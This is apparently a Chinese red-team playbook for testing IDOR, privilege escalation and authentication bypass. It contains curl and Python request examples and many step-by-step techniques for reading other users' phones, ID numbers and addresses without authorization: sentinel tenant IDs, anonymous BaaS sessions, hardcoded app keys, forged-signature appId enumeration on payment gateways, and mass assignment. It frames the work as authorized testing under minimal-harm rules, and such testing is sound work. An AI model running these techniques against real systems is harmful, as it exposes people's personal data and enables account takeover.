# 越权 / 认证接管（IDOR / 垂直水平越权 / 任意登录 / 会话）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


> 写不写只认 `../hw-rules/report-format.md`。进站有会话时最低探针见 `../hw-rules/workflow.md` §4.2.3（对象图、换 id、哨兵值）；单号用列表/回包里的他人 id，不为第二号磨注册。默认先用读/列表差分证明跨用户·跨租户。写越权仍要测，但**不是**对着别人已有数据改/删。顺序见下「写越权怎么打」。禁止批量改删、禁止真资损。
> 手法索引指针用标题搜。英文 BOLA 百科已砍；写越权怎么打仍在上半。


## 越权漏洞（IDOR/权限绕过）测试手册

> **最小伤害：** 默认读/列表差分。写越权要测，按「先加自己的 → 再删自己加的」。不要把「只读」理解成「写 IDOR 不测不报」。

### 写越权怎么打（先加后清）

读差分够闭环就不要写。读不够、要证「能改别人的东西」时：

1. **先测添加。** 用自己的号（或未登录）调创建口，看能不能挂到别人名下 / 别人店 / 别人租户。成功 = 写越权已证。  
2. **再删自己刚加的那一条。** 用同一条接口或对应删除口清掉，别留脏数据。  
3. **不要**去改别人已有订单、改别人密码/角色、删别人原来的地址/券/商品。那些删不干净，也不是最小证伪。  
4. 现场没有创建口、只有改/删现成对象：改一个**自己能改回去**的测试字段，打一次就停。改密 / 改角色 / 改绑按 `../hw-rules/workflow.md` §4.2.2 和 `auth-idor.md` **可探**（拿掉旧验看过不过）；过了立刻改回；改不回就停在回包，不要把别人的密、角色、邮箱留下。  
5. 要证资损：只动**自己能改回去的**测试金额/状态，打一次立刻改回。不要真转走生产资金、不要清别人库存、不要把别人已有单改到收不回。**不是**支付/写 IDOR 不测。禁止批量、禁止对着生产主数据试删。本段是最小伤害，**不是**「写 IDOR / 接管 / 加字段不测」。

## 概念区分

- **水平越权**: 同权限级别，访问他人资源（A 访问 B 的订单）
- **垂直越权**: 低权限账户调用高权限接口（普通用户调管理员 API）
- **未授权访问**: 未登录直接访问需认证接口

---

## 测试流程

### Step 1: 找到用户标识参数

在以下位置寻找用户/资源标识：

```
URL 路径:    /api/user/12345/info
URL 参数:    ?userId=12345&orderId=ABC
请求体:      {"uid": 12345, "target_id": "user_abc"}
响应体中:    {"id": 12345, "created_by": 67890}  ← 收集这些 ID
```

**高价值接口特征**:
- 包含 `user`, `account`, `profile`, `order`, `bill`, `message` 的路径
- 响应包含他人的手机号、邮箱、真实姓名、身份证
- 修改类接口: `update`, `edit`, `delete`, `change`

### Step 2: 对象 id（有两号更好，没有也不磨注册）

```
有对照号：账号 A 登录拿 token，账号 B 的资源 ID 做对照。
单号 / 没号：用列表、回包、邻号、`0`/`-1`/空当他人 id（`../hw-rules/workflow.md` §4.2.3）。禁止为凑第二号去磨注册。
```

### Step 3: 替换标识符测试

```python
# 水平越权测试示例
# 用 A 的 token 访问 B 的资源

import requests

token_a = "Bearer eyJ..."
victim_user_id = "B的用户ID"

# 原始请求（访问自己）
r1 = requests.get(
    "https://target.com/api/user/info",
    params={"userId": "A的ID"},
    headers={"Authorization": token_a}
)

# 越权请求（访问 B）
r2 = requests.get(
    "https://target.com/api/user/info",
    params={"userId": victim_user_id},
    headers={"Authorization": token_a}
)

# 对比响应
print("自己:", r1.json())
print("他人:", r2.json())
# 若 r2 成功返回 B 的数据 → 水平越权
```

### Step 4: 垂直越权测试

```bash
# 用普通用户 token 调用管理员接口
# 先在管理员账号下抓包找到管理接口
ADMIN_ENDPOINT="https://target.com/api/admin/users/list"
USER_TOKEN="普通用户的token"

curl -X GET "$ADMIN_ENDPOINT" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json"

# 200 成功 → 垂直越权
# 403 Forbidden → 有权限控制
```

### Step 5: 未授权访问测试

```bash
# 去掉 Authorization 头直接请求
curl -X GET "https://target.com/api/user/info?userId=12345"

# 或替换为无效 token
curl -X GET "https://target.com/api/user/info?userId=12345" \
  -H "Authorization: Bearer invalid_token_123"
```

---

## 常见绕过技巧

### ID 猜测
```
数字 ID: 尝试 ±1, ±10, 0, -1, 999999
列表上的租户/应用字段：换别人真实 ID 拦了，再试 0 / -1 / 空 / 不传（见下「哨兵租户」）
UUID: 可能从响应或 JS 中获取其他用户 UUID
手机号: 某些接口直接用手机号做标识
```

### 参数污染
```
# 同名参数多次提交
POST /api/user/info?userId=A_ID&userId=B_ID
POST body: userId=A_ID   + URL: ?userId=B_ID
```

### 路径遍历
```
/api/user/A_ID/orders  →  /api/user/B_ID/orders
/api/order/123         →  /api/order/124, 125...
```

### 编码绕过
```
userId=12345         → userId=0x3039（16进制）
userId=12345         → userId=%31%32%33%34%35（URL编码）
```

---

## PoC 证据收集

```
必须保存:
1. 请求完整内容（含 token、headers）
2. 响应完整内容（含受害者数据）
3. 对比截图（A 的正常响应 vs 越权响应）
4. 受害账号 ID 和数据的对应关系证明
```

---

### 密文 ID（手法索引有指针）

认：改/查地址、订单、资料的请求 id 是一长串密文；回包或列表里能看到明文小数字；JS 有 `RSAUtils` / `JSEncrypt` / `security.js`，或写死 `modulus` + `exponent`。

打：密文不是墙。公钥谁都能用。

1. 先打自己的那条，对照回包里的明文 id  
2. 用同一套前端加密，把相邻数字（明文±1、再往两边走）自己加密  
3. 只换这个密文 id，会话不动  

算成：换过去之后出**别人**的姓名/手机/地址。只证明自己的密文能解回自己的明文 → 不算。

假点：服务端按会话过滤，加密对了也只回自己的；那把钥匙是验签用的，乱加密直接拒。单站没中不删手法索引这行。钥的实值、某站 `security.js` 链接不进库，现场从当前站 JS 抄。

### 哨兵租户（手法索引有指针）

认：工单 / 资质 / 会话列表带 `appId`、`tenantId`、`orgId`；回包里有附件 URL（`sign` + `file_name` + 又一个租户字段）。

打（换真实他 ID 是已有水平越权，这里多一枪）：

1. 租户字段试 `0`、`-1`、空串、不传 —— 后端常把哨兵值当成「不过滤」  
2. `total` / 条数相对本租户基线暴涨才算打穿；加大 `pageSize`、翻 `page` 只是把量拉全，**不是洞**  
3. 类型字段（`serviceType` 一类）同样试 `0` / `-1`，可能切到另一套业务单  
4. 列表里的带签下载：原样打开常 403；**`sign` / `file_name` 不动，只把 URL 里的租户改成自己的**（签名没罩住这个字段）。正文在 `file-upload.md` 预签名那段  

算成：列表出现他租户的工单正文 / 客服对话，或附件真下到对方证照。主体是跨租户业务读。

假点：`0` 仍只回自己的；换租户下载 403；只有文件通道、没有业务列表。哨兵值没中 → 不删这行，下一站列表过滤照样试。

### 制品库 catalog 不过滤租户（手法索引有指针）

认：有容器 / 云函数 / 小程序云；能 `docker login` 或看到 Registry / Harbor / `/v2/`。

打：这是列表越权，不是未授权下文件。

1. 用**自己的号**登录制品库  
2. `GET /v2/_catalog`（Harbor 还有项目列表一类接口，同一枪）  
3. 回包仓库名对得上**别人租户** → 再 `/v2/<仓库>/tags/list`，`docker pull` 其中一个  

算成：catalog 里是他租户的私有仓，并且镜像能拉下来（层里是对方的应用/配置）。只证明自己能 login、只能拉官方公开镜像 → 不算。

假点：catalog 只回自己的；列出名字但 pull 403；本来就是公开库。单站没中不删手法索引这行。

和匿名 fileId 下载、和 OSS 桶策略全开都不是一条：本条是 **登录后 catalog 把全站私有仓交出来**。

### 登录前缀双胞胎（手法索引有指针）

认：业务 H5 把登录 RPC 写在 `/fapi/d/`（或同类需登录前缀）；同网关另有 `/fapi/n/`（或 n / unlogin / guest）未登录前缀。只打 JS 里的 d 口会看起来整段请登录。

打（不登录）：

1. 对照 d 口应请登录 / 要票  
2. 把 path 里的 `d` 改成 `n`，同一 RPC、同一对象 id 再打  
3. 换邻号；回包证件照 URL 跟着打开  

算成：不登录出他人身份证 / 证件照 / 手机。

假点：n 仍请登录；n 只有公开配置；只有自己刚交的补件。单站没中不删手法索引这行。

### 数字 RPC 邻 cmd（手法索引有指针）

认：业务页 JS 调数字 RPC 网关（`/data/{数字}/forward` 一类）。页面往往只写死一个 cmd（发票/广告一类）。邻号可能是另一套内部列表/写口，不要停在写死的那一个。`数字 RPC 网关` 是常见皮，没有这名仍打。

打（不登录）：

1. 抄 JS 里的 forward 地址，把 path 里的数字换成邻号  
2. 先空 `{"req":{}}` 看列表；对照写死 cmd 应是另一套业务  
3. 列表出内部记录再带 id 打邻写口（先假 id / 已空 id）。过了能改回的改回  

算成：内部发布/操作人正文，或字段被改。

假点：邻号仍是同一套公开接口；只出公开软件目录。密钥实值不进库。单站没中不删手法索引这行。

### 身份域账号 CRUD（手法索引有指针）

认：同产品业务前端的账号 CRUD 口回登录闸（`AuthFailure.NoLogin`）；另有独立 `*-ids` 身份子域，同一套 `/api/ms-account/` 不要 Cookie。GET list 可能 404，POST 才出数。

打（不登录）：

1. 业务前端同一条 list 对照应登录闸  
2. 改打 ids 子域 `POST /api/ms-account/user/list`，空包/`Offset+Limit` 都试  
3. 通了再 `generate` → `reset-pwd` 只带 Id（不带 Id 应参数错误）→ `delete` 清探测号  

算成：名单里是手机/企业邮箱；能建号、不验旧密改密、按 Ids 删。

假点：只打了业务前端就当没洞；list 出数但 Mail/Phone 全空且写口也闸。单站没中不删手法索引这行。

### 列表过滤详情不闸（手法索引有指针）

认：公开列表只出上架/公开；详情、hidden、tab、预览/导出用同一个业务 id。或列表有可见性查询参，默认把隐藏滤掉。或列表要登录/空包，详情只要数字 id + 业务键（workid 一类）。或对外详情把联系人/手机置空，审核/approval 详情用同一个业务 id。或文档 CMS 前端写死公开 `area` / `端` / `channel`，API 不鉴权。或对外搜索口有素材类型参（`materialType` / `tab`）默认公开值。或入驻/审核 query 只带业务 id 默认空壳。或同产品全量列表口不带可见性参，行里就带着 unpublished/offline 详情正文，公开搜索和橱窗详情仍闸。或浏览页/目录写访客请登录，同站 search API 未登录仍出内部/专有文档正文。

打（不登录）：

1. 记下公开列表 id；列表没有的 id 丢给详情 / hidden / tab；详情 403 再跟预览 / 导出  
2. 列表口自己加 `status=hidden` / `all` / `private`（或同类可见性参）。对照：不带参列表空或只有公开；同一 id 打详情仍「没有权限」也别停——闸可能只套在详情上  
3. **这条列表口 401 / 要登录 / 空包别停。** 换同产品另一条 guest 查询，看回包 `hidden` / `is_public` / `isHidden`。公开 contents 404 再打 hidden/contents 同一 id。详情只要数字 id + 业务键仍打。`is_secret=1` 仍出全文别停在标题。  
4. **详情 200 且 JSON 已写尚未发布 / 要登录 / `canAnswer=false`，别停。** 看同包 `savedConfigDraft` / 同类草稿字段有没有未发布正文。拦截文案和草稿可以在同一份 JSON。  
5. **对外详情 contact / mobile / email 置空别停。** 同一 id 再打审核 / approval / audit 详情；闸可能只套在对外展示口。  
6. **作品/项目有 `period=edit|publish`（或同类状态参）别停在 publish。** 不登录打内容口 `period=edit`。对照：同一 id 的 publish 说不存在/已删除，info 挡「没权读别人的」。edit 仍出正文才算。  
7. **JSON 列表筛选项 null / 缺字段报 Unknown / 参数错误，别停。** 把该字段改成空数组 `[]` 再打。后端常把空数组当成「不过滤」，匿名出下架 / 全表；缺参或 null 反而拦。对照：`null` 或删掉该键应报错或空，`[]` 才出已下架正文。
8. **文档 CMS 前端写死公开 `area` / `端` / `channel`，别停在默认值。** 未登录把参改成内部区（常见 1 vs 2、oa vs public）。对照：默认公开列表没有的接入/加固/内网算法正文，改参后列表或详情出来才算。  
9. **对外搜索口有 `materialType`（或同类素材类型）别停在前端默认公开值。** 对照公开规范/橱窗类型，改成内部市场素材、营销规范一类。path 缺 `/v2/` 报 `auth failed` 别停，按前端替换规则补上再打。算成：SSO 墙后、`isLimitAuth=1` 的内部物料名单/文件直链。  
10. **自助入驻/审核 query 只带门店号/业务 id 出空壳别停。** 加上审核状态=已通过（`baseInfoStatus` 一类）再打。回包 `uid` 立刻跟邮箱/联系人口。对照：不带状态应空壳或没手机。  

11. **证照图 JSON 没有 idNo 别停。** 详情出商标注册证 / 执照扫描件就打开看：注册人行常把身份证号拼在姓名后面。图上对得上人就算，不要只扫 JSON 字段。  
12. **导出任务列表 `pageNum=0` 空别当没数据。** 改 `pageNum=1` 再打，常能出全站别人的导出。抄 `fileName` / key 打 download。
13. **详情 telephone / 手机字段打码别停。** 未发布详情的 `requirement` / 备注 / 自由文本里常把完整 11 位手机写进去，接口只剥了结构化字段。
14. **全量列表口不带可见性参也打。** 行里直接看 unpublished / offline / rejected 详情正文。对照：公开搜索该 id total=0、人打开的橱窗详情说不存在。别只打公开搜索和详情页就当没洞。
15. **浏览页/目录写访客请登录别停。** 同站 search API（Keyword+Page+PageSize）未登录仍可能出内部/专有文档正文和详情 URL。详情页 JSON `isLogined=false` 仍出全文别停。对照：人打开的目录页写着访客请登录才能看。
16. **详情口已补 / 项目不存在别停。** 同站 visit-log / 埋点 / doc-add-visit-log 只要数字篇号仍可能出 OA/内部全文。对照：原详情口同一业务 id 应已拦。
17. **目录写访客请登录才能看/下别停。** 同站文件列表口（`getHomeCosFileList` 一类，`solution_id`+`version_id`+`folder_id=0`）未登录仍可能出培训视频/白皮书/手册名单。列表 `file_id` 丢权限口（`getFilePrivilege`）看 `PreviewUrl` / 带签下载。对照：人打开的目录页写着访客请登录才能看、才能下。
18. **内容 SPA 按 `location.host` 正则选 Color/网关域，别打错 TLD。** JS 里常见 `.*\\.jd\\.hk` → `内容网关域`；打成 `打错的内容网关域` 会当没口。打法仍是不登录楼层 queryContents + previewContentDetail。对照公开详情应不存在/1414。
19. **文档站公开 itemList / 目录只出对外产品别停。** 未登录把 `item`（或同类项目号）改成纯数字自增打详情/page。正文可能是压缩 markdown，按前端同一套解开。对照：公开 itemList 没有的「对内/未对外/不对外」库才算。
20. **收集表/问卷填报详情 JSON 的 relative / 关联表挂着答卷 sheet 别停。** 人打开的是填报页，答卷表可能另有 id。不登录打答卷表详情/opendoc。对照：填报页只是题目，答卷表才出身份证/手机单元格。
21. **内容预览口只要数字 contentId，回包 `isDelete=1` / 已删除 / 未发布别停。** 对照公开橱窗应没有这篇。出整页 H5 或编辑器 JSON 才算，不要只看标题。

算成：未公开业务正文从列表出来（不是公开橱窗标题）；或他主体手机 / 证件；或证照图注册人行印着身份证号；或未发布/已下架作品源码正文。

假点：加了可见性参仍只出公开稿；只有标题没有正文；列表 401 就当没洞；edit 和 publish 出同一份已上架正文；空数组和缺参出同一份上架稿；`materialType` 仍只出公开橱窗；只带业务 id 出空壳就当没洞、没再加审核状态；只打了公开搜索/橱窗详情就当没洞；浏览页写请登录就当没洞；数字 item 仍是那几本公开文档。打错 Color 域当没口不是假点。单站没中不删手法索引这行。

### 过网关无需鉴权头（手法索引有指针）

认：物流 / 开放网关（`lop-proxy` 一类）前端 JS 写死 `Auth-Control: no-auth` + `LOP-DN`（业务域）。其它业务口请登录，带着这组头名单/运单口仍出数。

打（不登录）：

1. 抄 JS 里的 `LOP-DN` 和 `Auth-Control: no-auth`（或同类过网关鉴权头）  
2. 空翻页打站点/名单口；再换可枚举 `siteId` 打运单/详情  
3. 对照：不带头应请登录或 Host 未注册  

算成：出他人手机 / 住址 / 站点联系人，不是公开轨迹。

假点：头过了业务仍请登录；只有公开轨迹没有 PII。单站没中不删手法索引这行。

### 匿名会话读报名表（手法索引有指针）

认：BaaS 匿名 session；列表口不验管理员。页面写死几个管理员 ID，后台跳登录。Appwrite / Weavefox / TablesDB 是常见皮，没有这名仍打。前端常见 `Client().setEndpoint`、`X-Appwrite-Project`、`POST /v1/account/sessions/anonymous`；报名/活动表走 `tablesDB.listRows`。

打（不登录、不要管理员号）：

1. 无 Cookie 先打 `GET /v1/tablesdb/{db}/tables/{table}/rows` —— 基线应是 `total=0` / 空 rows（系统其实会拦游客）  
2. `POST /v1/account/sessions/anonymous` body `{}`，头带同一 `X-Appwrite-Project`，拿 `Set-Cookie: a_session_…`  
3. 带着这条匿名会话再打同一 listRows  

算成：匿名会话后 `total` 相对空会话暴涨，rows 里是**别人**的手机 / 邮箱 / 报名正文。管理员白名单只写在浏览器里、没套到列表口。

假点：无会话已经是全表（那是完全无鉴权，另记）；匿名会话仍空或只有自己刚填的一条；DELETE 别人行 401 只说明写没开，读仍算；公开运营展示名单。单站没中不删手法索引这行。

和「无 Project key、连匿名会话都不用就能 CRUD」不是同一枪：本条关键是 **匿名 session 被当成已登录，且不验管理员**。

### 云开发匿名用户表（手法索引有指针）

认：云开发开了匿名登录；有低代码数据源函数。控制台或前端能抄到环境 id。不是手法索引已有的 proxy `targetUrl`，也不是 BaaS `sessions/anonymous`。

打（不登录）：

1. `POST https://{envId}.api.云开发网关/auth/v1/signin/anonymously`，头 `x-device-id`，body `{}`，拿 JWT  
2. `POST /v1/functions/lowcode-datasource`，`Authorization: Bearer` 那张票，body `dataSourceName=sys_user`、`methodName=wedaGetRecords`（`getRecords` 同源）  
3. 对照：同一网关 `GET /auth/v1/user/query` 应拦匿名；数据源名 `users` 常行权限失败，**不要停**，`sys_user` 才是系统用户表  
4. HTTP 网关（常见 `/web?env=`）回 `LOGIN_TYPE_DISABLED` **别停**：改 `POST /web?env=`，`auth.signInAnonymously` → `auth.getUserInfo` 拿 `jwt;expire`（**不要去掉分号后缀**）→ `functions.invokeFunction`，同样打 `sys_user` / `wedaGetRecords`  
5. 旧 HS256 票丢 `/v1/functions` 报 `KID_INVALID` → 这枪没成，换第 4 步网关票，不要当「数据源不存在」  
6. `sys_user` 行权限失败 **别停**：同一张 `/web` 匿名票改 `database.countDocument` / `database.queryDocument`，`collectionName=users`（互联登录落库的用户表，不是数据源名 `users`）  

算成：records 里是**他人**手机 / 邮箱 / uin / 超管标记，不是自己刚匿名建的空号。

假点：行权限拒匿名且 `/web` users 集合也空；数据源不存在；只出演示 todo/sales；旧 HS256 票 `KID_INVALID` 当没洞。HTTP 网关 `LOGIN_TYPE_DISABLED` 不是假点。数据源名 `users` 失败不算假点。单站没中不删手法索引这行。密钥实值、某次 JWT 不进库。

### 详情抄 openid 再打信箱（手法索引有指针）

认：招募/指定用户详情带 `specifyUsers` 或 openid；H5 写死 SHA256 请求签名；或邀请页地址已有 `?openid=`。

打（不登录）：

1. 调详情抄 openid  
2. 钥算 Signature 再打 `/msg/message/list/`  
3. URL 上已有 openid 则再打无签名的 `get_invite_code` / `count` / `detail`，名单 `uid` 可再填回去  

算成：换 openid 信箱或邀请码/名单变，出现对方积分过期通知或打码手机昵称。

假点：列表人人一样只是全站广播；接口要真登录/签名；假 openid 没有邀请码；公开运营名单。单站没中不删手法索引这行。

### 资料库 nodeId 未授权读全文（手法索引有指针）

认：发布页 conversation-data 的 artifactMap 有资料库 `nodeId`；主站 `/space/d/` 要登录。

打（不登录）：打发布域 `POST /space/api/page/share/query/pagechunk`（body=`pageId=nodeId`）。对照：分享页自己的 pageId 应是「不可分享」。

算成：拉到他人文档全文（标题/角色卡/大纲，`role=editor`）。

假点：只读到已发布 HTML 快照；pagechunk 对资料库也 12607；正文已在对话快照里。单站没中不删手法索引这行。

### 匿名 CSRF 头读详情（手法索引有指针）

认：匿名 CSRF/临时 token 口直接出 token；业务详情只验这个头不验登录；query 的数字 id 和回包 `data.id` 可以不是同一个号。不是助手 `GetHistoryList` 可选登录头（那枪见「助手历史未授权读他人任务」）。

打（不登录）：

1. 打 csrf/token 口拿头  
2. 详情换数字 id（1、2、13），**query id 对不上回包 id 别停**  
3. 对照：不带头应失败；不存在的 id 应「不存在」

算成：未上架/测试训练脚本或内部会话正文（cardMap/对白全文，不是标题）。

假点：只有公开广场；token 过了仍空。单站没中不删手法索引这行。

### 自定义身份头当会话（手法索引有指针）

认：管理后台 SPA 请求拦截器把自定义头（`User-Id` / `employeeId` / `X-User-Id` 一类）当登录身份，不要 Cookie。未登录名单口往往只出数字员工/BD 号，没有手机。

打（不登录）：

1. 抄 JS 拦截器里的头名  
2. 未登录打名单（空参/总部筛）。只有数字号**别停**  
3. 把头换成这个号打当前人信息口。对照：不带头或填 `1` 应查空  

算成：出他人姓名+11 位手机。

假点：头过了仍空；名单已经出手机（那是另一条）。单站没中不删手法索引这行。

和「匿名 CSRF 头读详情」不是一条：那条是临时 token 头，这条是**身份数字号进头**。和「入驻 H5 空参出招商通讯录」也不是一条：那条类目空着整表出手机，这条名单没手机还要再把头当身份打一枪。

### 客户详情口还吃 phone（手法索引有指针）

认：CRM / 企业 IM 客户详情口前端只写了外部联系人 id（`externalUserId` / `contactId`）。只带这个 id 回空壳。后端还吃 `phone`，常还要 `tagShow` / `udfShow` 才出内部字段。

打（不登录）：

1. 对照只带外部联系人 id 应空壳  
2. body 加 11 位 `phone`，并把 `tagShow` / `udfShow`（或同类展开字段）打开  
3. 空号 / 乱填应空壳；换号必须换人  

算成：出他人姓名 / 公司 / 内部 UDF，且查的就是这个完整号。

假点：phone 一律空或只出同一条测试号。身份证槽位空不算假点。单站没中不删手法索引这行。

### 助手历史未授权读他人任务（手法索引有指针）

认：助手/Agent 前端有 `GetHistoryList`；登录态只在可选头里。不是对话口工具执行（那枪见 `agent-tool-exec.md`）。

打（不登录）：调列表，换 guid 对照是否同一批；再把 `session_id` 丢给 `GetHistory`。翻页 `last_ts`+`direct=back`。

算成：列表/详情出现**他人**任务原文（下载、订阅、对话卡片），不是公开广场。

假点：只出广场 `GetSquareTasks`/`share_id`；换 guid 列表变空或只剩自己的。单站没中不删手法索引这行。

### 写死 appKey 打业务表（手法索引有指针）

认：前端 `AV.init` / LeanCloud 写死 `appId`+`appKey`（或 `X-LC-Id`/`X-LC-Key`）；或 nocode/supabase 落地页写死 `role=anon` JWT。

打（不登录）：带这两头打 `/1.1/classes/*`：先 `_User` 对照应 403，再扫业务表 count/limit，能写就改探测字段再删回。supabase 带 `apikey`+`Authorization: Bearer` 打 `/rest/v1/` swagger 列出的表。**rest 表 403 / 只有公开运营配置别停**：改打 `POST /storage/v1/object/{桶}/{官方前缀}`，头 `x-upsert:true`（见 `file-upload.md` STS 第 9 步）。

算成：业务表 `count` 海量或出现**他人**稿/邮箱/电话；PUT 改别人 `objectId` 成功。

假点：`_User` 和业务表都 403；只能读自己刚建的；只能 LIST 公开运营配置。单站没中不删手法索引这行。密钥实值不进库。

### 填表模型带标准答案（手法索引有指针）

认：问卷/测验填表模型口；前端写死业务 id 或白名单（`FORM_WHITE_LISTS` / 演示 encryptFormId 一类）；回包 schema 带 `answer` 标准答案或内部审核题干/样图。不是公开报名表标题，也不是已经交过的答卷列表。

打（不登录）：

1. 从 JS 白名单/演示 id 打 getModel / schema / getFormModel，别停在表单标题  
2. schema 里的样图 preview/imgUrl 跟着打开  
3. 管理 list/export/fillList 另打；没有填写记录不要编答卷  

算成：内部测验正文+标准答案，或证件/执照样图真下到。

假点：只有公开报名表标题；schema 没有 answer；只有自己刚填的答卷。单站没中不删手法索引这行。

### 未授权内部话术正文（手法索引有指针）

认：客服/开发者支持台 umi 有 `getKnowledgeList.json` + `getKnowledgeInfo.json`；或大厅/帮助 HTML 详情口吃数字篇号；或对外公告 JSON（bulletin / getbulletin 一类）用 `callname` + `callcontent` 当 RPC，页面只调公开菜单（`getKnowledgeByMenuId`）；或未登录 CMS `siteList` / `contentList` / `content` 能列出非官网站点，且频道名带「内部知识库」；或客服/IT chatbot 未登录检索口（菜单 id + 模糊 searchText），正文在 `buttonList`/`searchList` 的 `behavior.value`，不在标题 `content`。不要只认 umi 那一套 json。

打（不登录）：对照 `queryUserInfo`/`queryFeedbackList` 应 deny。列表 `categoryId` 从 1 试，再把 `id` 丢给 Info。**没有 json 列表也打 HTML 详情**（`showKnowledgeInfo.htm?knowledgeId=` / `help_detail.htm?help_id=`），用现代 UA（IE 可能触 netd）。公告口：页面公开菜单对照条数很少时，把 `callname` 换成 `getKnowledgeList`（`callcontent` 带翻页），再 `getKnowledge` 打详情 id。CMS：先 `siteList` 抄非官网 siteId，再 `contentList` 看频道名，换 siteId 打 `content` 详情；默认官网 Banner 不是这枪。网关报 `loginMode is null` 别停，头加 `loginMode: 0`；siteList 仍缺 siteId 失败时，直接带内部 siteId 打 contentList。content 也要带 siteId，缺了会当没正文。chatbot：`chat_dir_id` 一类目录口 401 别停，改打检索口（`search_recommend` 一类），`searchText` 填常用字、`id` 填菜单号；正文看 `behavior.value`。

算成：列表 `pager.items` 上千或 count 海量，且 Info/HTML/详情/`behavior.value` 出**内部**话术/协查/短信/运营知识库正文，不是公开 FAQ / 对外协议。

假点：只有公开帮助稿/错误码/对外协议/官网 Banner；Info 只要标题；工单口也放行（那是另一条）；只打了默认官网站点；dir 节点 401 就停；检索口只出标题 content。单站没中不删手法索引这行。

### 开放支付假签枚举 appId（手法索引有指针）

认：开放支付 / 进件网关 body 有 `appId`+`sign`（可再加 `random`/`merchantId`）。假签时活应用回 `MERCHANT_NOT_EXIST` 或 `SUCCESS`，死应用回 `SIGN_ERROR` / `APP_NOT_FOUND`。不是「JS 写死盐自己算」那一行，也不是文档里抄出真 AppSecret。

打（不登录）：

1. `sign` 填一串假值（32 个 `a` 一类），扫 `appId`，对照回码  
2. 活的再打商户查询（`query` / `query/v2`）换 `merchantId`（文档示例号、邻号）  
3. 同一套假签再点签订/协议口，只看回包是否接受；不要批量签、不要改结算卡  

4. **ST / 演示收银台预下单**假签或 node 代签也能进生产网关时：不登录 POST `/api/precreate` 或 `/demoapi/precreate`，sign 填假值 + 活 appId + 他人 merchantId。本站查单 404 别停，打生产 `/api/pay/query`。

算成：出他人商户身份证 / 银行卡 / 手机；或生产查单 `ORDER_NEW` 且有他商户交易号。

假点：假签一律 `SIGN_ERROR`；`SUCCESS` 但证件卡号全空；文档示例 appId 已死；只回 `channelPayerNo` 且生产查单不存在；只能给演示店挂。单站没中不删手法索引这行。密钥实值不进库。

### 短链 302 query 带手机（手法索引有指针）

认：短信/运营短链解析站；猜中的短码 302 到落地页，query 明文带 `phone` / `name` / 金额。首页可能是 OpenResty 欢迎页、302 到品牌官网、或 `index.html` 只有 Hello，**不要只看 `/` 当整站证伪**。

打（不登录）：

1. `/open` `/app` `/s/` `/www` 加短字典（`aaaaa`、`1`、`1234`）  
2. 只看 302 目标 query，不要跟到落地业务域  
3. 对照：对不上的码应失效页、没有手机号  

算成：跳转地址里是**别人**的手机/姓名。

假点：失效页；公开营销无 PII；短码要真短信才解析。单站没中不删手法索引这行。首页 Welcome / 302 官网 / Hello 壳不是假点。

### 隐私号失败回真实号（手法索引有指针）

认：订单/门店/物流 H5 调隐私号或虚拟号（AXB）口；未登录只要业务 appid + 可遍历对象号。失败时回包把真实 11 位手机当下发，文案还写获取隐私号失败、将用真实号码拨打。不要只当虚拟号口丢掉。

打（不登录）：

1. 前端抄 functionId / 隐私号 path，对象号从 0、2、邻号打  
2. 对照：非数字对象号应参数错、没有手机  
3. 换号号码变才算批量  
4. 网关空 Origin 或本站 Origin 回 `cross-origin 403` **别停**，改业务域 Origin（订单 / 购物车 / H5 域，不钉某一家 host）再打  

算成：回包是**他人**真实手机。

假点：只出虚拟号/中间号；必须登录；换号号码不变；空 Origin 403 当没口。单站没中不删手法索引这行。

### 入驻 H5 空参出招商通讯录（手法索引有指针）

认：入驻 H5 有招商电话页；同套其它 settle 口 302 未登录。JS 里按品类查 BD 的 RPC（queryBd / bdInfo 一类），industry/类目空时 body 空。页面上可能只摆 400 热线。

打（不登录）：

1. 从招商电话页 JS 抄网关 `/api` 和 functionId  
2. 类目字段空着打（`body={}`）。对照：填死数字类目号常回空数组  
3. 同套其它 settle 口 302 别当整站没口  

算成：内部 BD 姓名+11 位手机+企业邮箱整表。

假点：类目填死数字出空数组就当没口；把页面公开 400 热线当这枪。单站没中不删手法索引这行。

### 入驻 H5 写死 token 换 pin（手法索引有指针）

认：入驻 H5 / 小程序打包 JS 把 OCR / 企业信息口 token 写死。JSON 口只要 pin（或同类账号）+ 非空 token，不要 Cookie。对照：token 留空或省略只回空 data。

打（不登录）：

1. 从入驻 chunk 抄写死 token 和企业信息 path  
2. 空 token 对照应空 data  
3. 带写死 token，pin 用 `admin` / `test` / `0` / 短账号再打  
4. 写死那串过了，再填任意非空串对照（过了说明不校验 token 内容）  

算成：换 pin 出对应真实手机。

假点：空 token 也出数（完全无鉴权，另一条）；token 过了仍只出自己刚入驻的。单站没中不删手法索引这行。密钥实值不进库。

### 公司名/抬头自动完成（手法索引有指针）

认：报名/入驻/发票抬头自动完成；页上下拉只出公司名；接口走工商/邓白氏 Match 或抬头 suggest。前端可能把该口标 `auth:true`，服务端仍不验登录。

打（不登录）：

1. POST 名称+国家码，或抬头口。suggest 字段可能是 `prefix`（填 `title` 会报「关键词不能为空」像没入口）  
2. suggest 报关键词空别停：同产品还有专票/工商补全口，字段就是 `title`，前端标 `auth:true` 仍打  
3. 对照页面下拉：页上只有公司名，回包多出手机/卡/住址才算  

算成：回包出现负责人或开票手机/住址/银行账号，且对得上人。

假点：下拉和接口都只有公司名；必须登录；公开企业名录没有电话；前端标 auth 就当没洞。单站没中不删手法索引这行。


### Mass Assignment / 隐藏可写字段（手法索引有指针）

认：注册 / 改资料 / 建用户的 JSON 比页面控件多；Swagger、管理员「建用户」或前端注释里多出 `role` / `isAdmin` / `verified` / `tenantId` / `balance` / `permissions`。

打：

1. 对照管理员建用户 vs 自己注册/改资料，差出来的字段才塞。没有对照就从 Swagger / JS 抄。
2. 只对自己的号塞一次；过了立刻改回。不要改别人已有账号的角色。
3. `__proto__` / 嵌套 `user.role` 也试；这和 PP 模板 RCE 不是一条（PP 见 `prototype-pollution.md`）。

算成：自己号变成高权，或余额/认证状态真变。字段吃了、权限没变 → 没成。

假点：只能改展示名；公开运营开关；服务端白名单吞掉多余键。单站没中不删手法索引这行。没注册/改资料口不要发明字段。

## 12. QUICK IDOR CHECKLIST

```
□ 有对照号更好；单号用列表/回包/邻号，不为第二号磨注册
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint（写：先 POST 添加，再删自己加的那条；勿删别人已有对象）
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own）
